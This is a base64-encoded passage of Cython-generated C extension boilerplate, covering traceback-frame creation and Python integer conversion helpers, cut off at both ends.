fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICBfX3B5eF9hdG9taWNfc3ViKCZjb2RlX2NhY2hlLT5hY2Nlc3Nvcl9jb3VudCwgSU5UX01JTik7CiNlbmRpZgojZW5kaWYKfQoKCiNpbmNsdWRlICJjb21waWxlLmgiCiNpbmNsdWRlICJmcmFtZW9iamVjdC5oIgojaW5jbHVkZSAidHJhY2ViYWNrLmgiCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMGE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmICFkZWZpbmVkKFBZUFlfVkVSU0lPTikKICAjaWZuZGVmIFB5X0JVSUxEX0NPUkUKICAgICNkZWZpbmUgUHlfQlVJTERfQ09SRSAxCiAgI2VuZGlmCiAgI2luY2x1ZGUgImludGVybmFsL3B5Y29yZV9mcmFtZS5oIgojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeUNvZGVfUmVwbGFjZV9Gb3JfQWRkVHJhY2ViYWNrKFB5T2JqZWN0ICpjb2RlLCBQeU9iamVjdCAqc2NyYXRjaF9kaWN0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmZpcnN0bGluZW5vLCBQeU9iamVjdCAqbmFtZSkgewogICAgUHlPYmplY3QgKnJlcGxhY2UgPSBOVUxMOwogICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtU3RyaW5nKHNjcmF0Y2hfZGljdCwgImNvX2ZpcnN0bGluZW5vIiwgZmlyc3RsaW5lbm8pKSkgcmV0dXJuIE5VTEw7CiAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW1TdHJpbmcoc2NyYXRjaF9kaWN0LCAiY29fbmFtZSIsIG5hbWUpKSkgcmV0dXJuIE5VTEw7CiAgICByZXBsYWNlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhjb2RlLCAicmVwbGFjZSIpOwogICAgaWYgKGxpa2VseShyZXBsYWNlKSkgewogICAgICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBQeU9iamVjdF9DYWxsKHJlcGxhY2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBzY3JhdGNoX2RpY3QpOwogICAgICAgIFB5X0RFQ1JFRihyZXBsYWNlKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQogICAgUHlFcnJfQ2xlYXIoKTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyB2b2lkIF9fUHl4X0FkZFRyYWNlYmFjayhjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSkgewogICAgUHlPYmplY3QgKmNvZGVfb2JqZWN0ID0gTlVMTCwgKnB5X3B5X2xpbmUgPSBOVUxMLCAqcHlfZnVuY25hbWUgPSBOVUxMLCAqZGljdCA9IE5VTEw7CiAgICBQeU9iamVjdCAqcmVwbGFjZSA9IE5VTEwsICpnZXRmcmFtZSA9IE5VTEwsICpmcmFtZSA9IE5VTEw7CiAgICBQeU9iamVjdCAqZXhjX3R5cGUsICpleGNfdmFsdWUsICpleGNfdHJhY2ViYWNrOwogICAgaW50IHN1Y2Nlc3MgPSAwOwogICAgaWYgKGNfbGluZSkgewogICAgICAgICh2b2lkKSBfX3B5eF9jZmlsZW5tOwogICAgICAgICh2b2lkKSBfX1B5eF9DTGluZUZvclRyYWNlYmFjayhfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsIGNfbGluZSk7CiAgICB9CiAgICBQeUVycl9GZXRjaCgmZXhjX3R5cGUsICZleGNfdmFsdWUsICZleGNfdHJhY2ViYWNrKTsKICAgIGNvZGVfb2JqZWN0ID0gX19weXhfZmluZF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSk7CiAgICBpZiAoIWNvZGVfb2JqZWN0KSB7CiAgICAgICAgY29kZV9vYmplY3QgPSBQeV9Db21waWxlU3RyaW5nKCJfZ2V0ZnJhbWUoKSIsIGZpbGVuYW1lLCBQeV9ldmFsX2lucHV0KTsKICAgICAgICBpZiAodW5saWtlbHkoIWNvZGVfb2JqZWN0KSkgZ290byBiYWQ7CiAgICAgICAgcHlfcHlfbGluZSA9IFB5TG9uZ19Gcm9tTG9uZyhweV9saW5lKTsKICAgICAgICBpZiAodW5saWtlbHkoIXB5X3B5X2xpbmUpKSBnb3RvIGJhZDsKICAgICAgICBweV9mdW5jbmFtZSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKGZ1bmNuYW1lKTsKICAgICAgICBpZiAodW5saWtlbHkoIXB5X2Z1bmNuYW1lKSkgZ290byBiYWQ7CiAgICAgICAgZGljdCA9IFB5RGljdF9OZXcoKTsKICAgICAgICBpZiAodW5saWtlbHkoIWRpY3QpKSBnb3RvIGJhZDsKICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpvbGRfY29kZV9vYmplY3QgPSBjb2RlX29iamVjdDsKICAgICAgICAgICAgY29kZV9vYmplY3QgPSBfX1B5eF9QeUNvZGVfUmVwbGFjZV9Gb3JfQWRkVHJhY2ViYWNrKGNvZGVfb2JqZWN0LCBkaWN0LCBweV9weV9saW5lLCBweV9mdW5jbmFtZSk7CiAgICAgICAgICAgIFB5X0RFQ1JFRihvbGRfY29kZV9vYmplY3QpOwogICAgICAgIH0KICAgICAgICBpZiAodW5saWtlbHkoIWNvZGVfb2JqZWN0KSkgZ290byBiYWQ7CiAgICAgICAgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGNfbGluZSA/IC1jX2xpbmUgOiBweV9saW5lLCBjb2RlX29iamVjdCk7CiAgICB9IGVsc2UgewogICAgICAgIGRpY3QgPSBQeURpY3RfTmV3KCk7CiAgICB9CiAgICBnZXRmcmFtZSA9IFB5U3lzX0dldE9iamVjdCgiX2dldGZyYW1lIik7CiAgICBpZiAodW5saWtlbHkoIWdldGZyYW1lKSkgZ290byBiYWQ7CiAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW1TdHJpbmcoZGljdCwgIl9nZXRmcmFtZSIsIGdldGZyYW1lKSkpIGdvdG8gYmFkOwogICAgZnJhbWUgPSBQeUV2YWxfRXZhbENvZGUoY29kZV9vYmplY3QsIGRpY3QsIGRpY3QpOwogICAgaWYgKHVubGlrZWx5KCFmcmFtZSkgfHwgZnJhbWUgPT0gUHlfTm9uZSkgZ290byBiYWQ7CiAgICBzdWNjZXNzID0gMTsKICBiYWQ6CiAgICBQeUVycl9SZXN0b3JlKGV4Y190eXBlLCBleGNfdmFsdWUsIGV4Y190cmFjZWJhY2spOwogICAgUHlfWERFQ1JFRihjb2RlX29iamVjdCk7CiAgICBQeV9YREVDUkVGKHB5X3B5X2xpbmUpOwogICAgUHlfWERFQ1JFRihweV9mdW5jbmFtZSk7CiAgICBQeV9YREVDUkVGKGRpY3QpOwogICAgUHlfWERFQ1JFRihyZXBsYWNlKTsKICAgIGlmIChzdWNjZXNzKSB7CiAgICAgICAgUHlUcmFjZUJhY2tfSGVyZSgKICAgICAgICAgICAgKHN0cnVjdCBfZnJhbWUqKWZyYW1lKTsKICAgIH0KICAgIFB5X1hERUNSRUYoZnJhbWUpOwp9CiNlbHNlCnN0YXRpYyBQeUNvZGVPYmplY3QqIF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RGb3JUcmFjZWJhY2soCiAgICAgICAgICAgIGNvbnN0IGNoYXIgKmZ1bmNuYW1lLCBpbnQgY19saW5lLAogICAgICAgICAgICBpbnQgcHlfbGluZSwgY29uc3QgY2hhciAqZmlsZW5hbWUpIHsKICAgIFB5Q29kZU9iamVjdCAqcHlfY29kZSA9IE5VTEw7CiAgICBQeU9iamVjdCAqcHlfZnVuY25hbWUgPSBOVUxMOwogICAgaWYgKGNfbGluZSkgewogICAgICAgIHB5X2Z1bmNuYW1lID0gUHlVbmljb2RlX0Zyb21Gb3JtYXQoICIlcyAoJXM6JWQpIiwgZnVuY25hbWUsIF9fcHl4X2NmaWxlbm0sIGNfbGluZSk7CiAgICAgICAgaWYgKCFweV9mdW5jbmFtZSkgZ290byBiYWQ7CiAgICAgICAgZnVuY25hbWUgPSBQeVVuaWNvZGVfQXNVVEY4KHB5X2Z1bmNuYW1lKTsKICAgICAgICBpZiAoIWZ1bmNuYW1lKSBnb3RvIGJhZDsKICAgIH0KICAgIHB5X2NvZGUgPSBQeUNvZGVfTmV3RW1wdHkoZmlsZW5hbWUsIGZ1bmNuYW1lLCBweV9saW5lKTsKICAgIFB5X1hERUNSRUYocHlfZnVuY25hbWUpOwogICAgcmV0dXJuIHB5X2NvZGU7CmJhZDoKICAgIFB5X1hERUNSRUYocHlfZnVuY25hbWUpOwogICAgcmV0dXJuIE5VTEw7Cn0Kc3RhdGljIHZvaWQgX19QeXhfQWRkVHJhY2ViYWNrKGNvbnN0IGNoYXIgKmZ1bmNuYW1lLCBpbnQgY19saW5lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IHB5X2xpbmUsIGNvbnN0IGNoYXIgKmZpbGVuYW1lKSB7CiAgICBQeUNvZGVPYmplY3QgKnB5X2NvZGUgPSAwOwogICAgUHlGcmFtZU9iamVjdCAqcHlfZnJhbWUgPSAwOwogICAgUHlUaHJlYWRTdGF0ZSAqdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50OwogICAgUHlPYmplY3QgKnB0eXBlLCAqcHZhbHVlLCAqcHRyYWNlYmFjazsKICAgIGlmIChjX2xpbmUpIHsKICAgICAgICBjX2xpbmUgPSBfX1B5eF9DTGluZUZvclRyYWNlYmFjayh0c3RhdGUsIGNfbGluZSk7CiAgICB9CiAgICBweV9jb2RlID0gX19weXhfZmluZF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSk7CiAgICBpZiAoIXB5X2NvZGUpIHsKICAgICAgICBfX1B5eF9FcnJGZXRjaEluU3RhdGUodHN0YXRlLCAmcHR5cGUsICZwdmFsdWUsICZwdHJhY2ViYWNrKTsKICAgICAgICBweV9jb2RlID0gX19QeXhfQ3JlYXRlQ29kZU9iamVjdEZvclRyYWNlYmFjaygKICAgICAgICAgICAgZnVuY25hbWUsIGNfbGluZSwgcHlfbGluZSwgZmlsZW5hbWUpOwogICAgICAgIGlmICghcHlfY29kZSkgewogICAgICAgICAgICAKICAgICAgICAgICAgUHlfWERFQ1JFRihwdHlwZSk7CiAgICAgICAgICAgIFB5X1hERUNSRUYocHZhbHVlKTsKICAgICAgICAgICAgUHlfWERFQ1JFRihwdHJhY2ViYWNrKTsKICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgfQogICAgICAgIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKHRzdGF0ZSwgcHR5cGUsIHB2YWx1ZSwgcHRyYWNlYmFjayk7CiAgICAgICAgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGNfbGluZSA/IC1jX2xpbmUgOiBweV9saW5lLCBweV9jb2RlKTsKICAgIH0KICAgIHB5X2ZyYW1lID0gUHlGcmFtZV9OZXcoCiAgICAgICAgdHN0YXRlLCAgICAgICAgICAgIAogICAgICAgIHB5X2NvZGUsICAgICAgICAgICAKICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAgICAKICAgICAgICAwICAgICAgICAgICAgICAgICAgCiAgICApOwogICAgaWYgKCFweV9mcmFtZSkgZ290byBiYWQ7CiAgICBfX1B5eF9QeUZyYW1lX1NldExpbmVOdW1iZXIocHlfZnJhbWUsIHB5X2xpbmUpOwogICAgUHlUcmFjZUJhY2tfSGVyZShweV9mcmFtZSk7CmJhZDoKICAgIFB5X1hERUNSRUYocHlfY29kZSk7CiAgICBQeV9YREVDUkVGKHB5X2ZyYW1lKTsKfQojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0Zyb21fbG9uZyhsb25nIHZhbHVlKSB7CiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUMKI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBwdXNoCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIgojZW5kaWYKICAgIGNvbnN0IGxvbmcgbmVnX29uZSA9IChsb25nKSAtMSwgY29uc3RfemVybyA9IChsb25nKSAwOwojaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcG9wCiNlbmRpZgogICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87CiAgICBpZiAoaXNfdW5zaWduZWQpIHsKICAgICAgICBpZiAoc2l6ZW9mKGxvbmcpIDwgc2l6ZW9mKGxvbmcpKSB7CiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoKGxvbmcpIHZhbHVlKTsKICAgICAgICB9IGVsc2UgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YodW5zaWduZWQgbG9uZykpIHsKICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tVW5zaWduZWRMb25nKCh1bnNpZ25lZCBsb25nKSB2YWx1ZSk7CiNpZiBkZWZpbmVkKEhBVkVfTE9OR19MT05HKSAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAgICAgfSBlbHNlIGlmIChzaXplb2YobG9uZykgPD0gc2l6ZW9mKHVuc2lnbmVkIFBZX0xPTkdfTE9ORykpIHsKICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tVW5zaWduZWRMb25nTG9uZygodW5zaWduZWQgUFlfTE9OR19MT05HKSB2YWx1ZSk7CiNlbmRpZgogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YobG9uZykpIHsKICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZygobG9uZykgdmFsdWUpOwojaWZkZWYgSEFWRV9MT05HX0xPTkcKICAgICAgICB9IGVsc2UgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YoUFlfTE9OR19MT05HKSkgewogICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21Mb25nTG9uZygoUFlfTE9OR19MT05HKSB2YWx1ZSk7CiNlbmRpZgogICAgICAgIH0KICAgIH0KICAgIHsKICAgICAgICB1bnNpZ25lZCBjaGFyICpieXRlcyA9ICh1bnNpZ25lZCBjaGFyICopJnZhbHVlOwojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNAogICAgICAgIGlmIChpc191bnNpZ25lZCkgewogICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21VbnNpZ25lZE5hdGl2ZUJ5dGVzKGJ5dGVzLCBzaXplb2YodmFsdWUpLCAtMSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTmF0aXZlQnl0ZXMoYnl0ZXMsIHNpemVvZih2YWx1ZSksIC0xKTsKICAgICAgICB9CiNlbGlmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMAogICAgICAgIGludCBvbmUgPSAxOyBpbnQgbGl0dGxlID0gKGludCkqKHVuc2lnbmVkIGNoYXIgKikmb25lOwogICAgICAgIHJldHVybiBfUHlMb25nX0Zyb21CeXRlQXJyYXkoYnl0ZXMsIHNpemVvZihsb25nKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpdHRsZSwgIWlzX3Vuc2lnbmVkKTsKI2Vsc2UKICAgICAgICBpbnQgb25lID0gMTsgaW50IGxpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTsKICAgICAgICBQeU9iamVjdCAqZnJvbV9ieXRlcywgKnJlc3VsdCA9IE5VTEwsICprd2RzID0gTlVMTDsKICAgICAgICBQeU9iamVjdCAqcHlfYnl0ZXMgPSBOVUxMLCAqb3JkZXJfc3RyID0gTlVMTDsKICAgICAgICBmcm9tX2J5dGVzID0gUHlPYmplY3RfR2V0QXR0clN0cmluZygoUHlPYmplY3QqKSZQeUxvbmdfVHlwZSwgImZyb21fYnl0ZXMiKTsKICAgICAgICBpZiAoIWZyb21fYnl0ZXMpIHJldHVybiBOVUxMOwogICAgICAgIHB5X2J5dGVzID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSgoY2hhciopYnl0ZXMsIHNpemVvZihsb25nKSk7CiAgICAgICAgaWYgKCFweV9ieXRlcykgZ290byBsaW1pdGVkX2JhZDsKICAgICAgICBvcmRlcl9zdHIgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhsaXR0bGUgPyAibGl0dGxlIiA6ICJiaWciKTsKICAgICAgICBpZiAoIW9yZGVyX3N0cikgZ290byBsaW1pdGVkX2JhZDsKICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICphcmdzWzMrKENZVEhPTl9WRUNUT1JDQUxMID8gMSA6IDApXSA9IHsgTlVMTCwgcHlfYnl0ZXMsIG9yZGVyX3N0ciB9OwogICAgICAgICAgICBpZiAoIWlzX3Vuc2lnbmVkKSB7CiAgICAgICAgICAgICAgICBrd2RzID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygxKTsKICAgICAgICAgICAgICAgIGlmICgha3dkcykgZ290byBsaW1pdGVkX2JhZDsKICAgICAgICAgICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdTdHIoInNpZ25lZCIsIF9fUHl4X05ld1JlZihQeV9UcnVlKSwga3dkcywgYXJncyszLCAwKSA8IDApIGdvdG8gbGltaXRlZF9iYWQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmVzdWx0ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKGZyb21fYnl0ZXMsIGFyZ3MrMSwgMiB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwga3dkcyk7CiAgICAgICAgfQogICAgICAgIGxpbWl0ZWRfYmFkOgogICAgICAgIFB5X1hERUNSRUYoa3dkcyk7CiAgICAgICAgUHlfWERFQ1JFRihvcmRlcl9zdHIpOwogICAgICAgIFB5X1hERUNSRUYocHlfYnl0ZXMpOwogICAgICAgIFB5X1hERUNSRUYoZnJvbV9ieXRlcyk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKI2VuZGlmCiAgICB9Cn0KCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMApzdGF0aWMgX19QeXhfVHlwZU5hbWUKX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeVR5cGVPYmplY3QqIHRwKQp7CiAgICBQeU9iamVjdCAqbW9kdWxlID0gTlVMTCwgKm5hbWUgPSBOVUxMLCAqcmVzdWx0ID0gTlVMTDsKICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBiMDAwMAogICAgbmFtZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoKFB5T2JqZWN0ICopdHAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3F1YWxuYW1lKTsKICAgICNlbHNlCiAgICBuYW1lID0gUHlUeXBlX0dldFF1YWxOYW1lKHRwKTsKICAgICNlbmRpZgogICAgaWYgKHVubGlrZWx5KG5hbWUgPT0gTlVMTCkgfHwgdW5saWtlbHkoIVB5VW5pY29kZV9DaGVjayhuYW1lKSkpIGdvdG8gYmFkOwogICAgbW9kdWxlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cigoUHlPYmplY3QgKil0cCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbW9kdWxlKTsKICAgIGlmICh1bmxpa2VseShtb2R1bGUgPT0gTlVMTCkgfHwgdW5saWtlbHkoIVB5VW5pY29kZV9DaGVjayhtb2R1bGUpKSkgZ290byBiYWQ7CiAgICBpZiAoUHlVbmljb2RlX0NvbXBhcmVXaXRoQVNDSUlTdHJpbmcobW9kdWxlLCAiYnVpbHRpbnMiKSA9PSAwKSB7CiAgICAgICAgcmVzdWx0ID0gbmFtZTsKICAgICAgICBuYW1lID0gTlVMTDsKICAgICAgICBnb3RvIGRvbmU7CiAgICB9CiAgICByZXN1bHQgPSBQeVVuaWNvZGVfRnJvbUZvcm1hdCgiJVUuJVUiLCBtb2R1bGUsIG5hbWUpOwogICAgaWYgKHVubGlrZWx5KHJlc3VsdCA9PSBOVUxMKSkgZ290byBiYWQ7CiAgZG9uZToKICAgIFB5X1hERUNSRUYobmFtZSk7CiAgICBQeV9YREVDUkVGKG1vZHVsZSk7CiAgICByZXR1cm4gcmVzdWx0OwogIGJhZDoKICAgIFB5RXJyX0NsZWFyKCk7CiAgICBpZiAobmFtZSkgewogICAgICAgIHJlc3VsdCA9IG5hbWU7CiAgICAgICAgbmFtZSA9IE5VTEw7CiAgICB9IGVsc2UgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X05ld1JlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xNik7CiAgICB9CiAgICBnb3RvIGRvbmU7Cn0KI2VuZGlmCgoKI2RlZmluZSBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlKVwKICAgIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCAwKQojZGVmaW5lIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlKVwKICAgIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCAxKQojZGVmaW5lIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCBleGMpXAogICAge1wKICAgICAgICBmdW5jX3R5cGUgdmFsdWUgPSBmdW5jX3ZhbHVlO1wKICAgICAgICBpZiAoc2l6ZW9mKHRhcmdldF90eXBlKSA8IHNpemVvZihmdW5jX3R5cGUpKSB7XAogICAgICAgICAgICBpZiAodW5saWtlbHkodmFsdWUgIT0gKGZ1bmNfdHlwZSkgKHRhcmdldF90eXBlKSB2YWx1ZSkpIHtcCiAgICAgICAgICAgICAgICBmdW5jX3R5cGUgemVybyA9IDA7XAogICAgICAgICAgICAgICAgaWYgKGV4YyAmJiB1bmxpa2VseSh2YWx1ZSA9PSAoZnVuY190eXBlKS0xICYmIFB5RXJyX09jY3VycmVkKCkpKVwKICAgICAgICAgICAgICAgICAgICByZXR1cm4gKHRhcmdldF90eXBlKSAtMTtcCiAgICAgICAgICAgICAgICBpZiAoaXNfdW5zaWduZWQgJiYgdW5saWtlbHkodmFsdWUgPCB6ZXJvKSlcCiAgICAgICAgICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XAogICAgICAgICAgICAgICAgZWxzZVwKICAgICAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1wKICAgICAgICAgICAgfVwKICAgICAgICB9XAogICAgICAgIHJldHVybiAodGFyZ2V0X3R5cGUpIHZhbHVlO1wKICAgIH0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBsb25nIF9fUHl4X1B5TG9uZ19Bc19sb25nKFB5T2JqZWN0ICp4KSB7CiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUMKI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBwdXNoCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIgojZW5kaWYKICAgIGNvbnN0IGxvbmcgbmVnX29uZSA9IChsb25nKSAtMSwgY29uc3RfemVybyA9IChsb25nKSAwOwojaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcG9wCiNlbmRpZgogICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87CiAgICBpZiAodW5saWtlbHkoIVB5TG9uZ19DaGVjayh4KSkpIHsKICAgICAgICBsb25nIHZhbDsKICAgICAgICBQeU9iamVjdCAqdG1wID0gX19QeXhfUHlOdW1iZXJfTG9uZyh4KTsKICAgICAgICBpZiAoIXRtcCkgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICB2YWwgPSBfX1B5eF9QeUxvbmdfQXNfbG9uZyh0bXApOwogICAgICAgIFB5X0RFQ1JFRih0bXApOwogICAgICAgIHJldHVybiB2YWw7CiAgICB9CiAgICBpZiAoaXNfdW5zaWduZWQpIHsKI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxvbmdfSXNOZWcoeCkpKSB7CiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93OwogICAgICAgIH0gZWxzZSBpZiAoX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBfX1B5eF9jb21wYWN0X3VweWxvbmcsIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWVVbnNpZ25lZCh4KSkKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyh4KTsKICAgICAgICAgICAgYXNzZXJ0KF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpID4gMSk7CiAgICAgICAgICAgIHN3aXRjaCAoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkpIHsKICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID49IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgMzoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgPj0gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8